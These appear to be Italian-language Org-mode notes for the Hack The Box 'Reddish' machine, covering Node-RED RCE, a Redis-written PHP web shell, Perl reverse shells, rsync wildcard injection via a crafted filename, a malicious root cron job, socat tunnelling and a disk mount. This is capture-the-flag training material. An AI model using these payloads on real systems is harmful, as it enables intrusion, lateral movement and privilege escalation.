@@ -1,0 +1,396 @@
+#+TITLE: HTB - Reddish
+
+* Enumeration
+** nmap
+*** leo@kali:~/repos/reddish$ nmap -sC -sV reddish
+  #+begin_example
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-27 05:28 CET
+Nmap scan report for reddish (10.129.180.246)
+Host is up (0.050s latency).
+All 1000 scanned ports on reddish (10.129.180.246) are closed
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1.51 seconds
+
+  #+end_example
+*** leo@kali:~/repos/reddish$ nmap -p- reddish
+  #+begin_example
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-27 05:28 CET
+Nmap scan report for reddish (10.129.180.246)
+Host is up (0.051s latency).
+Not shown: 65534 closed ports
+PORT     STATE SERVICE
+1880/tcp open  vsat-control
+
+Nmap done: 1 IP address (1 host up) scanned in 16.01 seconds
+
+  #+end_example
+*** leo@kali:~/repos/reddish$ nmap -sC -sV -p 1880 reddish
+  #+begin_example
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-27 05:29 CET
+Nmap scan report for reddish (10.129.180.246)
+Host is up (0.052s latency).
+
+PORT     STATE SERVICE VERSION
+1880/tcp open  http    Node.js Express framework
+|_http-title: Error
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.07 seconds
+
+  #+end_example
+
+** curl
+*** curl -X POST http://reddish:1880
+    
+    #+begin_example
+{"id":"e72c52ec2ba93670b5b9fcc018afcdff","ip":"::ffff:10.10.14.7","path":"/red/{id}"}    
+    #+end_example
+
+** RCE on NODE-red
+   https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/
+   
+   #+begin_src sh
+curl -L https://gist.githubusercontent.com/QKaiser/79459c3cb5ea6e658701c7d203a8c297/raw/8966e4ee07400f16b92737161ca8df3cbfa37f91/noderedsh.py  > noderedsh.py
+   #+end_src
+   
+   Devo modificare la funzione ~exploit()~ con il seguente codice
+   rispetto al seguente ~diff~
+
+   diff original_noderedsh.py modified_noderesh.py 
+   
+   #+begin_example
+252,256c252,256
+<                     messages = json.loads(response)
+<                     for message in messages:
+<                         if "topic" in message and message["topic"] == "debug":
+<                             output = message["data"]["msg"].strip()
+<                             break
+---
+>                     message = json.loads(response)
+> 
+>                     if "data" in message and message["topic"] == "debug":
+>                         output = message["data"]["msg"].strip()
+>    
+   #+end_example
+   
+   #+begin_src sh
+python3 noderedsh.py http://reddish:1880/red/e72c52ec2ba93670b5b9fcc018afcdff
+> id
+   #+end_src
+   
+* PrivEsc
+** Network Structure
+
+*** 172.19.0.1/16
+   #+begin_example
+172.19.0.1 --> router (macchina host/processo docker)
+
+172.19.0.4 --> nodered (docker #1)
+
+172.19.0.2 --> redis (docker #2)
+  nome dominio: reddish_composition_redis_1.reddish_composition_internal-network
+  porta 6379 aperta
+   
+172.19.0.3 --> www (docker #3)
+  nome dominio: reddish_composition_www_1.reddish_composition_internal-network
+  port 80 aperta
+   #+end_example
+
+*** 172.20.0.1/16
+    
+    #+begin_example
+172.20.0.2 --> backup (docker #4)
+  nome dominio: reddish_composition_backup_1.reddish_composition_internal-network-2
+  porta 873 aperta
+    #+end_example    
+
+** Docker #1 (NODE-red)
+*** ip a
+    #+begin_example
+# ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+11: eth0@if12: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff
+    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+17: eth1@if18: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:ac:13:00:04 brd ff:ff:ff:ff:ff:ff
+    inet 172.19.0.4/16 brd 172.19.255.255 scope global eth1
+       valid_lft forever preferred_lft forever    
+    #+end_example
+** Docker #2 (Redis)
+   
+   #+begin_src sh
+./ncat 172.19.0.2 6379
+
+set cmd "<?php echo system($_REQUEST['cmd']) ?>"
+config set dbfilename "test.php"
+config set dir "/var/www/html/"
+save
+   #+end_src
+
+** Docker #3 (www)
+   Per accedere al docker ~www~ possiamo utilizzare ~NODE-red~ con il
+   seguente flusso:
+
+   - *input http node*
+
+   - *http request node*
+     
+     #+begin_example
+http://reddish_composition_www_1.reddish_composition_internal-network/test.php?cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22172.19.0.4%22%3B%24p%3D4321%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27     
+     #+end_example
+
+   - *http output node*
+
+   Possiamo direttamente importante il seguente flusso
+   
+   #+begin_src js
+[
+  {
+    "id": "7fc6c61d.3449a8",
+    "type": "http in",
+    "z": "32468df0.73c4e2",
+    "name": "",
+    "url": "/hello",
+    "method": "get",
+    "upload": false,
+    "swaggerDoc": "",
+    "x": 350,
+    "y": 260,
+    "wires": [
+      [
+        "8107a55.15eb558"
+      ]
+    ]
+  },
+  {
+    "id": "19a1e8bc.974347",
+    "type": "http response",
+    "z": "32468df0.73c4e2",
+    "name": "",
+    "statusCode": "",
+    "headers": {
+    },
+    "x": 917,
+    "y": 267,
+    "wires": []
+  },
+  {
+    "id": "8107a55.15eb558",
+    "type": "http request",
+    "z": "32468df0.73c4e2",
+    "name": "",
+    "method": "GET",
+    "ret": "txt",
+    "url": "http://reddish_composition_www_1.reddish_composition_internal-network/test.php?cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22172.19.0.4%22%3B%24p%3D4321%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27",
+    "tls": "",
+    "x": 630,
+    "y": 440,
+    "wires": [
+      [
+        "19a1e8bc.974347"
+      ]
+    ]
+  }
+]   
+   #+end_src
+
+** Pivoting from Docker #1 to Docker #3 
+   
+   Per passare dal docker ~nodered~ al docker ~www~ devo:
+
+   1. Entrare in ~redis~ da ~nodered~ e salvare il file malevolo ~test.php~
+      
+      #+begin_src sh
+./ncat 172.19.0.2 6379
+
+set cmd "<?php echo system($_REQUEST['cmd']) ?>"
+config set dbfilename "test.php"
+config set dir "/var/www/html/"
+save      
+      #+end_src
+
+   2. Mettermi in ascolto su ~nodered~ 
+
+      #+begin_src sh
+./ncat -lvnp 4321      
+      #+end_src
+      
+   3. Definire il flusso per accedere al web server
+      
+   4. Andare all'URL definito
+      
+      #+begin_example
+http://reddish:1880/api/e72c52ec2ba93670b5b9fcc018afcdff/hello      
+      #+end_example
+** PrivEsc on Docker #3
+   Andando in ~/backup/~ troviamo lo script ~backup.sh~ 
+
+   #+begin_src sh
+cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
+rsync -a *.rdb rsync://backup:873/src/rdb/
+cd / && rm -rf /var/www/html/*
+rsync -a rsync://backup:873/src/backup/ /var/www/html/
+chown www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b   
+   #+end_src
+
+   L'idea è quella di creare in
+   
+   #+begin_example
+   /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
+   #+end_example
+
+   due file:
+
+   1. Il primo file sarà chiamato '-e sh test.rdb' e può contenere
+      qualsiasi cosa.
+      
+      #+begin_src sh
+echo "yo" > '-e sh test.rdb';
+      #+end_src
+
+   2. Il secondo file sarà chiamato 'test.rdb' e conterrà il codice di
+      una reverse shell in PERL.
+
+   #+begin_src sh
+echo "#/bin/bash \n perl -e 'use Socket;\$i=\"172.19.0.4\";\$p=4321;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" > test.rdb   
+   #+end_src
+
+   Poi ci mettiamo in ascolto su ~nodered~ con ~ncat~ e otteniamo una
+   shell da root.
+   
+   #+begin_src sh
+./ncat -lvnp 4321   
+   #+end_src
+
+** Docker #4 (backup)
+
+   Dal docker #3 abbiamo accesso ad una nuova rete. 
+
+   #+begin_src sh
+
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+13: eth0@if14: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:ac:13:00:03 brd ff:ff:ff:ff:ff:ff
+    inet 172.19.0.3/16 brd 172.19.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+17: eth1@if18: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:ac:14:00:03 brd ff:ff:ff:ff:ff:ff
+    inet 172.20.0.3/16 brd 172.20.255.255 scope global eth1
+       valid_lft forever preferred_lft forever   
+   #+end_src
+
+   Tramite ~ping -c 1 backup~ vediamo l'indirizzo IP di bakcup, che è ~172.20.0.2~
+   
+   ------------------
+
+*** rsync usage
+
+   Per vedere i file nella macchina ~backup~ possiamo utilizzare ~rsync~
+
+   rsync -v rsync://backup:873/src/<PATH>
+
+   #+begin_example
+# rsync -v rsync://backup:873/src/
+receiving file list ... done
+drwxr-xr-x          4,096 2018/07/15 17:42:39 .
+-rwxr-xr-x              0 2018/05/04 21:01:30 .dockerenv
+-rwxr-xr-x            100 2018/05/04 19:55:07 docker-entrypoint.sh
+drwxr-xr-x          4,096 2018/07/15 17:42:41 backup
+drwxr-xr-x          4,096 2018/07/15 17:42:39 bin
+drwxr-xr-x          4,096 2018/07/15 17:42:38 boot
+drwxr-xr-x          4,096 2018/07/15 17:42:39 data
+drwxr-xr-x          3,640 2021/12/27 05:47:14 dev
+drwxr-xr-x          4,096 2018/07/15 17:42:39 etc
+drwxr-xr-x          4,096 2018/07/15 17:42:38 home
+drwxr-xr-x          4,096 2018/07/15 17:42:39 lib
+drwxr-xr-x          4,096 2018/07/15 17:42:38 lib64
+drwxr-xr-x          4,096 2018/07/15 17:42:38 media
+drwxr-xr-x          4,096 2018/07/15 17:42:38 mnt
+drwxr-xr-x          4,096 2018/07/15 17:42:38 opt
+dr-xr-xr-x              0 2021/12/27 05:47:14 proc
+drwxr-xr-x          4,096 2018/07/15 17:42:39 rdb
+drwx------          4,096 2018/07/15 17:42:38 root
+drwxr-xr-x          4,096 2021/12/27 05:47:15 run
+drwxr-xr-x          4,096 2018/07/15 17:42:38 sbin
+drwxr-xr-x          4,096 2018/07/15 17:42:38 srv
+dr-xr-xr-x              0 2021/12/27 18:01:11 sys
+drwxrwxrwt          4,096 2021/12/27 18:22:01 tmp
+drwxr-xr-x          4,096 2018/07/15 17:42:39 usr
+drwxr-xr-x          4,096 2018/07/15 17:42:39 var
+   
+   #+end_example
+
+*** docker-entrypoint.sh
+    
+    #+begin_src sh
+#!/bin/bash
+
+set -ex
+
+service cron start
+
+exec rsync --no-detach --daemon --config /etc/rsyncd.conf    
+    #+end_src
+** Pivoting from Docker #3 to Docker #4
+   L'idea è quella di creare un ~cronjob~ malevolo e di trasferirlo
+   nella macchina ~backup~ in modo che sia eseguito tramite ~rsync~.
+   
+   #+begin_src sh
+# comandi su www (docker #3)
+
+cd /tmp
+echo "* * * * * root perl -e 'use Socket;\$i=\"172.20.0.3\";\$p=9000;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" > test;
+
+rsync -v test rsync://backup:873/src/etc/cron.d/test
+
+./ncat -lvnp 9000
+   #+end_src
+
+   --------------
+   
+   Prima di metterci in ascolto con ncat sulla macchina ~www~ dobbiamo
+   trasferire ~ncat~ nella macchina ~www~. Per fare questo possiamo creare
+   un tunnel da ~NODE-red~ al nostro box ~kali~ tramite ~socat~ con il
+   seguente comando, che deve essere eseguito su ~nodered~
+   
+   #+begin_src sh
+# comandi su nodered (docker #1)
+
+# assumo di aver scaricato socat nella macchina nodered
+./socat TCP4-LISTEN:3334,fork TCP4:10.10.14.7:1337 &   
+   #+end_src
+   
+   Una volta fatto questo possiamo scaricare ncat su www con il
+   seguente comando, che deve essere eseguito su www
+
+   #+begin_src sh
+# comandi su www (docker #3)
+cd /tmp
+perl -e 'use File::Fetch;$url="http://172.19.0.4:3334/ncat";$ff=File::Fetch->new(uri => $url);$file=$ff->fetch() or die $ff->error;'
+   #+end_src
+
+   ----------------
+   
+   #+begin_example
+rsync -v rsync://backup:873/src/etc/cron.d/
+
+rsync -v test rsync://backup:873/src/etc/cron.d/test
+   #+end_example
+** PrivEsc on Docker #4
+   
+   #+begin_src sh
+ls /dev/sd*
+mount /dev/sda2 /mnt   
+   #+end_src
